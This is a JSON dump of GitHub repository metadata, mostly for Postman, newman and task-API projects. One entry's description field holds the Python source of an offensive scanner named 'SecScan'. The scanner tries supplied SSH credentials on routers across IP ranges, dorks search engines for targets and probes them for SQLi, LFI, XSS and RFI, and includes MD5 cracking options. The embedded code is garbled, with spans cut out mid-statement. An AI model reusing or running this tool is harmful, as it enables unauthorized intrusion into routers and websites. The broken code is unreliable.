[
  {
    "user": "carlowahlstedt",
    "repo": "NewmanPostman_VSTS_Task",
    "pulled": "User",
    "id": 109072838,
    "name": "NewmanPostman_VSTS_Task",
    "full_name": "carlowahlstedt/NewmanPostman_VSTS_Task",
    "description": "A task for Azure DevOps Pipelines to run newman tests.",
    "fork": false,
    "created_at": "2017-11-01T01:45:59Z",
    "updated_at": "2020-03-10T01:19:44Z",
    "forks": 19,
    "open_issues": 13,
    "watchers": 23,
    "network_count": 19,
    "subscribers_count": 2,
    "owner_id": 2687687,
    "owner_login": "carlowahlstedt",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/2687687?v=4",
    "owner_type": "User",
    "tags": [
      "test",
      "tests",
      "newman",
      "line",
      "task",
      "lines"
    ]
  },
  {
    "user": "kyleweishaar-zz",
    "repo": "JIRA-postman",
    "pulled": "User",
    "id": 140581261,
    "name": "JIRA-postman",
    "full_name": "kyleweishaar-zz/JIRA-postman",
    "description": "A script that runs postman collection to build a bunch of JIRA tasks",
    "fork": false,
    "created_at": "2018-07-11T13:45:54Z",
    "updated_at": "2018-10-11T17:16:54Z",
    "forks": 4,
    "open_issues": 0,
    "watchers": 1,
    "network_count": 4,
    "subscribers_count": 1,
    "owner_id": 22196349,
    "owner_login": "kyleweishaar-zz",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/22196349?v=4",
    "owner_type": "User",
    "tags": [
      " postman",
      "collect",
      "collection",
      "postman collection",
      "script",
      "build",
      "task",
      "tasks",
      "runs",
      "bunch"
    ]
  },
  {
    "user": "cassiomolin",
    "repo": "tasks-rest-api",
    "pulled": "User",
    "id": 93936502,
    "name": "tasks-rest-api",
    "full_name": "cassiomolin/tasks-rest-api",
    "description": "Sample REST API for managing tasks using Spring Boot, Jersey, Jackson, MapStruct, Hibernate Validator and REST Assured.",
    "fork": false,
    "created_at": "2017-06-10T12:03:24Z",
    "updated_at": "2020-02-17T14:35:57Z",
    "forks": 5,
    "open_issues": 0,
    "watchers": 9,
    "network_count": 5,
    "subscribers_count": 1,
    "owner_id": 2189398,
    "owner_login": "cassiomolin",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/2189398?v=4",
    "owner_type": "User",
    "tags": [
      "task",
      "tasks",
      "managing"
    ]
  },
  {
    "id": 47413105,
    "name": "PostmanExpress",
    "full_name": "aarondesanto/PostmanExpress",
    "description": null,
    "fork": false,
    "created_at": "2015-12-04T15:46:36Z",
    "updated_at": "2015-12-04T15:46:51Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 14984628,
    "owner_login": "aarondesanto",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/14984628?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 6720296,
    "name": "PostmanPat",
    "full_name": "MyMobile/PostmanPat",
    "description": null,
    "fork": false,
    "created_at": "2012-11-16T10:59:01Z",
    "updated_at": "2013-10-23T05:00:39Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 2813124,
    "owner_login": "MyMobile",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/2813124?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "user": "karolis-test-org",
    "repo": "postman1",
    "pulled": "Organization",
    "id": 75431752,
    "name": "postman1",
    "full_name": "karolis-test-org/postman1",
    "description": null,
    "fork": false,
    "created_at": "2016-12-02T21:19:54Z",
    "updated_at": "2016-12-02T21:19:54Z",
    "forks": 0,
    "open_issues": 0,
    "watchers": 0,
    "network_count": 0,
    "subscribers_count": 1,
    "owner_id": 24323030,
    "owner_login": "karolis-test-org",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/24323030?v=4",
    "owner_type": "Organization",
    "tags": []
  },
  {
    "user": "imzengyang",
    "repo": "postmanTest",
    "pulled": "User",
    "id": 132341539,
    "name": "postmanTest",
    "full_name": "imzengyang/postmanTest",
    "description": null,
    "fork": false,
    "created_at": "2018-05-06T13:35:05Z",
    "updated_at": "2018-05-06T13:36:50Z",
    "forks": 0,
    "open_issues": 0,
    "watchers": 0,
    "network_count": 0,
    "subscribers_count": 0,
    "owner_id": 22312483,
    "owner_login": "imzengyang",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/22312483?v=4",
    "owner_type": "User",
    "tags": []
  },
  {
    "user": "Bahram90",
    "repo": "PostmanCode",
    "pulled": "User",
    "id": 168385437,
    "name": "PostmanCode",
    "full_name": "Bahram90/PostmanCode",
    "description": null,
    "fork": false,
    "created_at": "2019-01-30T17:32:40Z",
    "updated_at": "2019-01-30T17:40:28Z",
    "forks": 0,
    "open_issues": 0,
    "watchers": 0,
    "network_count": 0,
    "subscribers_count": 0,
    "owner_id": 42274713,
    "owner_login": "Bahram90",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/42274713?v=4",
    "owner_type": "User",
    "tags": []
  },
  {
    "id": 199964019,
    "name": "postmanTester",
    "full_name": "t856727/postmanTester",
    "description": null,
    "fork": false,
    "created_at": "2019-08-01T02:47:23Z",
    "updated_at": "2019-08-01T03:06:11Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 12592060,
    "owner_login": "t856727",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/12592060?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "user": "karaevmaksim",
    "repo": "PostmanPortable",
    "pulled": "User",
    "id": 192778884,
    "name": "PostmanPortable",
    "full_name": "karaevmaksim/PostmanPortable",
    "description": null,
    "fork": false,
    "created_at": "2019-06-19T17:45:14Z",
    "updated_at": "2019-08-06T13:47:35Z",
    "forks": 0,
    "open_issues": 0,
    "watchers": 0,
    "network_count": 0,
    "subscribers_count": 0,
    "owner_id": 15080181,
    "owner_login": "karaevmaksim",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/15080181?v=4",
    "owner_type": "User",
    "tags": []
  },
  {
    "user": "BartoszDybczak",
    "repo": "PostmanRepo",
    "pulled": "User",
    "id": 236554500,
    "name": "PostmanRepo",
    "full_name": "BartoszDybczak/PostmanRepo",
    "description": null,
    "fork": false,
    "created_at": "2020-01-27T17:52:24Z",
    "updated_at": "2020-01-27T17:56:49Z",
    "forks": 0,
    "open_issues": 0,
    "watchers": 0,
    "network_count": 0,
    "subscribers_count": 1,
    "owner_id": 43844416,
    "owner_login": "BartoszDybczak",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/43844416?v=4",
    "owner_type": "User",
    "tags": []
  },
  {
    "id": 93936502,
    "name": "tasks-rest-api",
    "full_name": "cassiomolin/tasks-rest-api",
    "description": "Sample REST API for managing tasks using Spring Boot, Jersey, Jackson, MapStruct, Hibernate Validator and REST Assured.",
    "fork": false,
    "created_at": "2017-06-10T12:03:24Z",
    "updated_at": "2020-02-17T14:35:57Z",
    "stargazers_count": 9,
    "watchers_count": 9,
    "forks": 5,
    "watchers": 9,
    "score": 1,
    "owner_id": 2189398,
    "owner_login": "cassiomolin",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/2189398?v=4",
    "tags": [
      "task",
      "tasks",
      "managing"
    ]
  },
  {
    "id": 37828449,
    "name": "Postman",
    "full_name": "alexsanya/Postman",
    "description": "Test technical task for PlayKot",
    "fork": false,
    "created_at": "2015-06-21T22:22:13Z",
    "updated_at": "2015-06-21T22:53:37Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 2597570,
    "owner_login": "alexsanya",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/2597570?v=4",
    "pulled": 1,
    "tags": [
      "task",
      "tech",
      "technical"
    ]
  },
  {
    "id": 107467873,
    "name": "postman",
    "full_name": "edllygomez/postman",
    "description": null,
    "fork": false,
    "created_at": "2017-10-18T22:01:20Z",
    "updated_at": "2017-11-22T15:07:51Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 4808418,
    "owner_login": "edllygomez",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/4808418?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 85685304,
    "name": "postman-task",
    "full_name": "muralimano28/postman-task",
    "description": "Postman front end dev task. Replicating whatsapp web.",
    "fork": false,
    "created_at": "2017-03-21T09:53:18Z",
    "updated_at": "2017-03-21T09:54:20Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 11781824,
    "owner_login": "muralimano28",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/11781824?v=4",
    "pulled": 1,
    "tags": [
      "front",
      "task",
      "front end"
    ]
  },
  {
    "id": 203446801,
    "name": "CyberArk_EPM_Postman_Collection",
    "full_name": "seswho/CyberArk_EPM_Postman_Collection",
    "description": "The CyberArk Endpoint Privilege Manager Web Services enable you to automate tasks that are usually performed manually in the EPM console. Available for both on-premise and SaaS customers. Postman collection has documentation and examples",
    "fork": false,
    "created_at": "2019-08-20T20:07:36Z",
    "updated_at": "2020-02-14T13:52:19Z",
    "stargazers_count": 2,
    "watchers_count": 2,
    "forks": 1,
    "watchers": 2,
    "score": 1,
    "owner_id": 7858871,
    "owner_login": "seswho",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/7858871?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "form",
      "document",
      "auto",
      "example",
      "automat",
      "documentation",
      "perform",
      "automate",
      "task",
      "examples",
      "custom",
      "tasks",
      "enable",
      "console",
      "both",
      "customer",
      "customers",
      "manua",
      "usual",
      "performed"
    ]
  },
  {
    "id": 234817021,
    "name": "Postman_collection_sandbox",
    "full_name": "GProSoftware828/Postman_collection_sandbox",
    "description": "Make a Trello.com task management board using these API calls from Postman- all ready to go!",
    "fork": false,
    "created_at": "2020-01-19T00:31:45Z",
    "updated_at": "2020-03-08T10:56:33Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 25964838,
    "owner_login": "GProSoftware828",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/25964838?v=4",
    "pulled": 1,
    "tags": [
      "call",
      "manage",
      "calls",
      "read",
      "task",
      "management",
      "ready"
    ]
  },
  {
    "id": 196596255,
    "name": "restful_task_API",
    "full_name": "Dev-Steven/restful_task_API",
    "description": "Created a RESTful task API and testing the API using Postman",
    "fork": false,
    "created_at": "2019-07-12T14:46:55Z",
    "updated_at": "2019-07-17T03:38:15Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 21114178,
    "owner_login": "Dev-Steven",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/21114178?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "testing",
      "task"
    ]
  },
  {
    "id": 227797005,
    "name": "task-managment",
    "full_name": "most-007/task-managment",
    "description": "Cakephp  app for task management and rest API to get all links in a given html document URL , and API to sent PDF file using postman to a given email ",
    "fork": false,
    "created_at": "2019-12-13T08:54:39Z",
    "updated_at": "2019-12-30T08:42:28Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 9547339,
    "owner_login": "most-007",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/9547339?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "file",
      "rest",
      "document",
      "mail",
      "manage",
      "email",
      "html",
      "task",
      "management",
      "link",
      "given"
    ]
  },
  {
    "id": 162435319,
    "name": "Postman-task",
    "full_name": "samovolkinmaxim/Postman-task",
    "description": "This is a test repo for Postman task",
    "fork": false,
    "created_at": "2018-12-19T12:37:16Z",
    "updated_at": "2018-12-19T12:57:49Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 40469143,
    "owner_login": "samovolkinmaxim",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/40469143?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "repo",
      "task"
    ]
  },
  {
    "id": 215278682,
    "name": "postman-dummy-test",
    "full_name": "niroshan009/postman-dummy-test",
    "description": null,
    "fork": false,
    "created_at": "2019-10-15T11:12:01Z",
    "updated_at": "2019-10-16T06:32:04Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 55729320,
    "owner_login": "niroshan009",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/55729320?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 202239693,
    "name": "concourse-postman-task",
    "full_name": "atzawada/concourse-postman-task",
    "description": "A task to better handle running Postman tests in Concourse.",
    "fork": false,
    "created_at": "2019-08-13T23:51:16Z",
    "updated_at": "2019-08-20T14:23:35Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 32112934,
    "owner_login": "atzawada",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/32112934?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "tests",
      "tests ",
      "running",
      "course",
      "task",
      "handle",
      "better"
    ]
  },
  {
    "id": 199407927,
    "name": "ServletsTask_Part1",
    "full_name": "Mipside/ServletsTask_Part1",
    "description": " Servlets task with CRUD Operations, json files that are testing via Postman",
    "fork": false,
    "created_at": "2019-07-29T08:08:14Z",
    "updated_at": "2019-07-29T08:11:58Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 45482921,
    "owner_login": "Mipside",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/45482921?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "testing",
      "file",
      "json",
      "files",
      "task",
      "lets"
    ]
  },
  {
    "id": 143026789,
    "name": "serverside-tasks-with-sub-cat",
    "full_name": "mbMosman/serverside-tasks-with-sub-cat",
    "description": "Serverside code only for a tasks database with subtasks and categories with Postman Tests.  (Postgres/pg with JSON objects & transactions)",
    "fork": false,
    "created_at": "2018-07-31T14:37:17Z",
    "updated_at": "2019-03-27T17:20:13Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 5143491,
    "owner_login": "mbMosman",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/5143491?v=4",
    "pulled": 1,
    "tags": [
      "data",
      "database",
      "code",
      "action",
      "task",
      "side",
      "object",
      "tasks",
      "objects",
      "transactions"
    ]
  },
  {
    "id": 17645181,
    "name": "aa.py",
    "full_name": "udinparla/aa.py",
    "description": "#!/usr/bin/env python import re import hashlib import Queue from random import choice import threading import time import urllib2 import sys import socket  try:     import paramiko      PARAMIKO_IMPORTED = True except ImportError:     PARAMIKO_IMPORTED = False    USER_AGENT = [\"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3\",              \"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7\",              \"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\",              \"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)\",              \"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)\", \t     \"Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/535.38.6 (KHTML, like Gecko) Version/5.1 Safari/535.38.6\", \t     \"Mozilla/5.0 (Macintosh; U; U; PPC Mac OS X 10_6_7 rv:6.0; en-US) AppleWebKit/532.23.3 (KHTML, like Gecko) Version/4.0.2 Safari/532.23.3\"             ] option = ' ' vuln = 0 invuln = 0 np = 0 found = []   class Router(threading.Thread):     \"\"\"Checks for routers running ssh with given User/Pass\"\"\"     def __init__(self, queue, user, passw):         if not PARAMIKO_IMPORTED:             print 'You need paramiko.'             print 'http://www.lag.net/paramiko/'             sys.exit(1)         threading.Thread.__init__(self)              self.queue = queue          self.user = user         self.passw = passw       def run(self):         \"\"\"Tries to connect to given Ip on port 22\"\"\"         ssh = paramiko.SSHClient()         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())         while True:             try:                 ip_add = self.queue.get(False)              except Queue.Empty:                 break             try:                 ssh.connect(ip_add, username = self.user, password = self.passw, timeout = 10)                 ssh.close()                 print \"Working: %s:22 - %s:%s\\n\" % (ip_add, self.user, self.passw)                 write = open('Routers.txt', \"a+\")                 write.write('%s:22 %s:%s\\n' % (ip_add, self.user, self.passw))                 write.close()                   self.queue.task_done()              except:                 print 'Not Working: %s:22 - %s:%s\\n' % (ip_add, self.user, self.passw)                 self.queue.task_done()                               class Ip:     \"\"\"Handles the Ip range creation\"\"\"     def __init__(self):         self.ip_range = []         self.start_ip = raw_input('Start ip: ')         self.end_ip = raw_input('End ip: ')         self.user = raw_input('User: ')         self.passw = raw_input('Password: ')         self.iprange()             def iprange(self):         \"\"\"Creates list of Ip's from Start_Ip to End_Ip\"\"\"         queue = Queue.Queue()         start = list(map(int, self.start_ip.split(\".\")))         end = list(map(int, self.end_ip.split(\".\")))         tmp = start                 self.ip_range.append(self.start_ip)         while tmp != end:             start[3] += 1             for i in (3, 2, 1):                 if tmp[i] == 256:                     tmp[i] = 0                     tmp[i-1] += 1             self.ip_range.append(\".\".join(map(str, tmp)))                 for add in self.ip_range:             queue.put(add)          for i in range(10):             thread = Router(queue, self.user, self.passw )             thread.setDaemon(True)             thread.start()          queue.join()   class Crawl:     \"\"\"Searches for dorks and grabs results\"\"\"     def __init__(self):         if option == '4':             self.shell = str(raw_input('Shell location: '))         self.dork = raw_input('Enter your dork: ')         self.queue = Queue.Queue()         self.pages = raw_input('How many pages(Max 20): ')         self.qdork = urllib2.quote(self.dork)         self.page = 1         self.crawler()         def crawler(self):         \"\"\"Crawls Ask.com for sites and sends them to appropriate scan\"\"\"         print '\\nDorking...'         for i in range(int(self.pages)):             host = \"http://uk.ask.com/web?q=%s&page=%s\" % (str(self.qdork), self.page)             req = urllib2.Request(host)             req.add_header('User-Agent', choice(USER_AGENT))             response = urllib2.urlopen(req)             source = response.read()             start = 0             count = 1             end = len(source)             numlinks = source.count('_t\" href', start, end)               while count alert('xssBYm0le');\"\"\"         self.file = 'xss.txt'       def run(self):         \"\"\"Checks Url for possible Xss\"\"\"         while True:             try:                 site = self.queue.get(False)             except Queue.Empty:                 break             if '=' in site:                 global vuln                 global invuln                 global np                 xsite = site.rsplit('=', 1)[0]                 if xsite[-1] != \"=\":                     xsite = xsite + \"=\"                 test = xsite + self.xchar                 try:                     conn = urllib2.Request(test)                     conn.add_header('User-Agent', choice(USER_AGENT))                     opener = urllib2.build_opener()                     data = opener.open(conn).read()                 except:                     self.queue.task_done()                 else:                     if (re.findall(\"xssBYm0le\", data, re.I)):                         self.xss(test)                         vuln += 1                     else:                         print B+test + W+' > ' + str(vuln) + G+' Vulnerable Sites Found' + W     print '>> ' + str(invuln) + G+' Sites Not Vulnerable' + W     print '>> ' + str(np) + R+' Sites Without Parameters' + W     if option == '1':         print '>> Output Saved To sqli.txt\\n'     elif option == '2':         print '>> Output Saved To lfi.txt'     elif option == '3':         print '>> Output Saved To xss.txt'     elif option == '4':         print '>> Output Saved To rfi.txt'     W  = \"\\033[0m\";   R  = \"\\033[31m\";  G  = \"\\033[32m\";  O  = \"\\033[33m\";  B  = \"\\033[34m\";  def main():     \"\"\"Outputs Menu and gets input\"\"\"     quotes = [ \t'\\nm0le@tormail.org\\n'         ]     print (O+''' ------------- -- SecScan -- --- v1.5 ---- ---- by ----- --- m0le ---- -------------''')     print (G+''' -[1]-  SQLi -[2]-  LFI -[3]-  XSS -[4]-  RFI -[5]-  Proxy -[6]-  Admin Page Finder -[7]-  Sub Domain Scan -[8]-  Dictionary MD5 cracker -[9]-  Online MD5 cracker -[10]- Check your IP address''')      print (B+''' -[!]- If freeze while running or want to quit,  just Ctrl C, it will automatically terminate the job. ''')     print W     global option     option = raw_input('Enter Option: ')       if option:         if option == '1':             Crawl()             output()             print choice(quotes)                      elif option == '2':             Crawl()             output()             print choice(quotes)           elif option == '3':             Crawl()             output()             print choice(quotes)           elif option == '4':             Crawl()             output()             print choice(quotes)               elif option == '5':             Ip()             print choice(quotes)           elif option == '6':             admin()             aprint()             print choice(quotes)          elif option == '7':             subd()             print choice(quotes)          elif option == '8':             word()             print choice(quotes)            elif option == '9':             OnlineCrack().crack()             print choice(quotes)                              elif option == '10':             Check().grab()               print choice(quotes)                 else:             print R+'\\nInvalid Choice\\n' + W             time.sleep(0.9)             main()           else:         print R+'\\nYou Must Enter An Option (Check if your typo is corrected.)\\n' + W         time.sleep(0.9)         main()     if __name__ == '__main__':     main()",
    "fork": false,
    "created_at": "2014-03-11T20:35:08Z",
    "updated_at": "2019-11-23T18:43:58Z",
    "stargazers_count": 4,
    "watchers_count": 4,
    "forks": 0,
    "watchers": 4,
    "score": 1,
    "owner_id": 6923150,
    "owner_login": "udinparla",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/6923150?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "data",
      "file",
      "call",
      "http",
      "user",
      "auto",
      "automat",
      "mail",
      "line",
      "help",
      "route",
      "build",
      "send",
      "list",
      "site",
      "star",
      "source",
      "read",
      "import",
      "running",
      "response",
      "host",
      "start",
      "python",
      "connect",
      "need",
      "shop",
      "name",
      "html",
      "task",
      "search",
      "open",
      "print",
      "result",
      "main",
      "class",
      "automatic",
      "link",
      "header",
      "results",
      "creation",
      "done",
      "find",
      "given",
      "automatically",
      "many",
      "write",
      "location",
      "free",
      "router",
      "output",
      "gets",
      "sends",
      "correct",
      "while",
      "address",
      "pages",
      "found",
      "admin",
      "reading",
      "google",
      "random",
      "seek",
      "crawler",
      "grab"
    ]
  },
  {
    "id": 172330075,
    "name": "Todo",
    "full_name": "5FMTB/Todo",
    "description": "API with local database connection (.NET Core, Entity framework). This project is a Todo list, where you can add, modify or delete tasks using postman.",
    "fork": false,
    "created_at": "2019-02-24T11:38:27Z",
    "updated_at": "2019-03-21T07:54:37Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 47940868,
    "owner_login": "5FMTB",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/47940868?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "data",
      "database",
      "framework",
      "local",
      "list",
      "connect",
      "delete",
      "task",
      "tasks",
      "connection",
      "modify"
    ]
  },
  {
    "id": 227783010,
    "name": "task-manager-api",
    "full_name": "Shaykoo/task-manager-api",
    "description": "This app is purely based on NodeJS. This app is a task manager app which stores all the users and their tasks in MongoDB database with required authentication of the user to create, read, update and delete the users and their own particular tasks plus when a user gets created or deleted the app sends them email to notify. Use the website address to test it on postman. Get authenticated before using the app on postman.",
    "fork": false,
    "created_at": "2019-12-13T07:35:57Z",
    "updated_at": "2020-01-13T15:06:20Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 34743587,
    "owner_login": "Shaykoo",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/34743587?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "create",
      "data",
      "database",
      "user",
      "based",
      "mail",
      "auth",
      "manage",
      "send",
      "site",
      "read",
      "authentication",
      "users",
      "update",
      "delete",
      "email",
      "website",
      "store",
      "task",
      "require",
      "tasks",
      "authenticate",
      "gets",
      "sends",
      "required",
      "pure",
      "address",
      "authenticated",
      "manager",
      "notify",
      "purely"
    ]
  },
  {
    "id": 201312005,
    "name": "food-delivery-server-goit",
    "full_name": "SerhiiY/food-delivery-server-goit",
    "description": "A course task with using node.js server. All queries were tested by Postman. App can give products list or user by id and write a new product or user to the database. On master branch used http module, on express-hw branch express.js is used.",
    "fork": false,
    "created_at": "2019-08-08T18:06:53Z",
    "updated_at": "2019-09-10T10:36:12Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 34281627,
    "owner_login": "SerhiiY",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/34281627?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "data",
      "server",
      "node",
      "database",
      "http",
      "user",
      "express",
      " express",
      "tested",
      "list",
      "course",
      "task",
      "module",
      "product",
      "were",
      "queries",
      "products",
      "write",
      "master"
    ]
  },
  {
    "id": 232629310,
    "name": "cisco-nso-postman",
    "full_name": "jabelk/cisco-nso-postman",
    "description": "A collection of sample NSO API calls for common tasks, also used to generate the Swagger Docs Examples. All created using the nso-vagrant set up.",
    "fork": false,
    "created_at": "2020-01-08T18:18:37Z",
    "updated_at": "2020-01-09T16:22:35Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 11969274,
    "owner_login": "jabelk",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/11969274?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "create",
      "call",
      "generate",
      "sample",
      "calls",
      "task",
      "tasks",
      "common",
      "grant"
    ]
  },
  {
    "id": 212745338,
    "name": "FinalJavaTask",
    "full_name": "Jespert88/FinalJavaTask",
    "description": "Final java task where i have to build a RESTful Api with Java + spring + hibernate + mysql/postgresql + client(HTML / Postman))",
    "fork": false,
    "created_at": "2019-10-04T05:53:39Z",
    "updated_at": "2019-10-04T12:52:49Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 22000801,
    "owner_login": "Jespert88",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/22000801?v=4",
    "pulled": 1,
    "tags": [
      "client",
      "build",
      "java",
      "spring",
      "task",
      "mysql",
      "postgres",
      "hibernate",
      "postgresql"
    ]
  },
  {
    "id": 187546007,
    "name": "Task-Manager-API",
    "full_name": "jjian4/Task-Manager-API",
    "description": "Create, read, update, delete users and tasks. Uses web tokens for account authentication. Built using Node.js, Express.js, and MongoDB/Mongoose. Used Postman for testing.",
    "fork": false,
    "created_at": "2019-05-20T01:07:05Z",
    "updated_at": "2019-05-23T02:59:42Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 39073669,
    "owner_login": "jjian4",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/39073669?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "testing",
      "user",
      "auth",
      "read",
      "authentication",
      "users",
      "update",
      "delete",
      "task",
      "token",
      "account",
      "tasks",
      "tokens"
    ]
  },
  {
    "id": 225753441,
    "name": "Task-management-app",
    "full_name": "KenC1014/Task-management-app",
    "description": "This contains all server side Node.js files for task management application. This is a pure backend application. All the endpoints are accessible via Postman. Express server and Mongoose are used.",
    "fork": false,
    "created_at": "2019-12-04T01:38:27Z",
    "updated_at": "2020-01-29T08:02:22Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 26831001,
    "owner_login": "KenC1014",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/26831001?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "application",
      "server",
      "contain",
      "endpoint",
      "points",
      "files",
      "manage",
      "endpoints",
      "backend",
      "access",
      "task",
      "side",
      "management",
      "pure"
    ]
  },
  {
    "id": 201517749,
    "name": "note-app",
    "full_name": "luxie11/note-app",
    "description": "An API created for saving user tasks. For API testing used Postman. This API can be user for WEB application creation with React, Vue or any front-end framework. ",
    "fork": false,
    "created_at": "2019-08-09T18:03:55Z",
    "updated_at": "2019-08-09T19:53:51Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 29857050,
    "owner_login": "luxie11",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/29857050?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "create",
      "testing",
      "application",
      "user",
      "framework",
      "front",
      "task",
      "creation",
      "tasks",
      "saving"
    ]
  }
]